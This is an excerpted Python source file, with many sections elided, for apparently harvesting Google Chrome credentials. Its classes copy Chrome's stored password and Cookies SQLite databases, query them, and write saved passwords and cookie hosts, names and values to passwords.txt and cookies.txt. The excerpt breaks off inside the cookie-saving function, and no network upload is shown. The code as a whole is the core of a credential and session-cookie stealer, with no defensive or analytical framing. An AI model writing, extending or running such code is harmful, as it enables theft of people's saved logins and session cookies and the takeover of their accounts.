...
DB_COOKIE_PATH = os.path.join(
    APP_DATA_PATH, APP_FOLDER + r'\User Data\Default\Network\Cookies')
...
class ChromePassword:
    ...
    def get_chrome_db(self):
        ...
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_pass.txt')
        if debug ==1:
            print(_temp_path)
            print(self.dbPath)
        ...
        shutil.copy2(self.dbPath, _temp_path)
        return _temp_path
    ...
    def save_txt(self, fileOut='passwords.txt'):
        ...
        print('Save all passwords in ' + fileOut)
...
class ChromeCookie:
    ...
    def get_chrome_db(self):
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_cookie.txt') 
    ...
    def get_cookies(self):
        ...
        conn = sqlite3.connect(db_file)
        for row in conn.execute(self._sql):
            if debug == 1: print("get_cokies var row: "+str(row))
    ...
    def save_txt(self, fileOut='cookies.txt'): 
        ...
        print('Save all cookies in ' + fileOut)
        with open(fileOut, 'w', encoding='utf-8') as f:
            texts = [
                'Host: %s\nCreation: %s\nExpires: %s\nName: %s\nValue: %s\n\n' % (
